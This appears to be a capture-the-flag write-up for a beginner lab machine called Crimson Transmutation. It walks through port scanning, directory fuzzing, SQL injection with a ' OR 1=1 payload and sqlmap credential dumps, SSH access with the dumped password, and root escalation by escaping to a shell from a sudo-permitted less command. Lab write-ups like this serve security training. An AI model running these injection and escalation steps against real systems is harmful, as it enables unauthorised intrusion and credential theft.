# Crimson Transmutation

## 1. Introduction

### 1.1 Background

Crimson Transmutation is a beginner-friendly machine, themed around the Fullmetal Alchemist universe, focused on developing enumeration, web exploitation, and privilege escalation skills in Linux environments.

The scenario features a web system with a vulnerable legacy catalog, allowing exploitation via SQL Injection, followed by credential acquisition and privilege escalation through an insecure `sudo` configuration.

### 1.2 Objectives

- Enumerate exposed services on the target machine
- Identify vulnerabilities in the web application
- Exploit SQL Injection to obtain credentials
- Gain initial access via SSH
- Escalate privileges to root

---

## 2. Enumeration

### 2.1 Nmap

A full port scan is performed:

```bash
sudo nmap -p- -Pn -sS -n --min-rate 5000 192.168.56.104 --open
```
Results:

```bash
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
```

Two main attack vectors are identified:

- **SSH (22)** → Possible remote access
- **HTTP (80)** → Main attack vector

### 2.2 Web

Upon accessing the web service, a portal called:

**Central State Archive**

The site indicates the use of legacy systems:

> "Legacy catalog systems are still online for compatibility."

>

This suggests potential vulnerabilities in legacy components.

### 2.3 Fuzzing
```bash
ffuf -u http:<ip>/FUZZ -w /opt/seclists/Discovery/Web-Content/common.txt
```
Fuzzing is performed and the file `robots.txt` is found:

```
User-agent: *
Disallow: /catalog/
Disallow: /logs/
```

- `/logs/` → Not relevant (noise)
- `/catalog/` → Contains a search system

---

## 3. Exploitation

### 3.1 SQL Injection

A vulnerable search panel is found within `/catalog/`.

The payload is tested:

```
' OR 1=1-- -
```

The system returns all records, confirming a **SQL Injection**.

### 3.2 Enumeration with SQLMap

Exploitation is automated using SQLMap.

### Listing Databases

```bash
sqlmap -u "http://<ip>/catalog/search.php?q=test" --batch --dbs
```

Result:

```
Available databases [2]:
[*] crimson_db
[*] information_schema
```
### 3.3 Enumeration of Tables

```bash
sqlmap -u "http://<ip>/catalog/search.php?q=test" -D crimson_db --tables --batch
```

Result:

```bash
Database: crimson_db

[2 tables]
+-------------------+
| edward_records |

| researchers |

+-------------------+
```

### 3.4 Credential dump

```
sqlmap -u "http://<ip>/catalog/search.php?q=test" -D crimson_db -T edward_records --dump --batch
```

Credentials are obtained:

```
Edward : alchemy123
```

### 3.5 Initial access (SSH)

```bash
ssh edward@192.168.56.104
```

Inside the system:

```bash
ls
```

```
research_notes.txt user.txt
```

Relevant content:

```
The old archive search should have been retired months ago.

I told Al to move the binding study drafts out of my home directory.
He said he stored the final copy somewhere safer, but root still keeps the master archive.

``

### 3.6 Lateral Movement

List hidden files:

```bash
ls -la
```

Found:

```
.alphonse
```

This file contains credentials for the user **alphonse**.

Access:

```bash
su alphonse
```

---

## 4. Post-Exploitation

### 4.1 Privilege Escalation

Permissions are checked:

```bash
sudo -l
```

Result:

```
User alphonse may run the following commands on Crimson-Transmutation:

(ALL) NOPASSWD: /usr/bin/less /etc/crimson-maintenance.log
```

### 4.2 Exploiting Less

Execution:

```bash
sudo /usr/bin/less /etc/crimson-maintenance.log
```

Inside `less`:

```
!/bin/bash
```

### 4.3 root

```bash
whoami
```

```
root
```
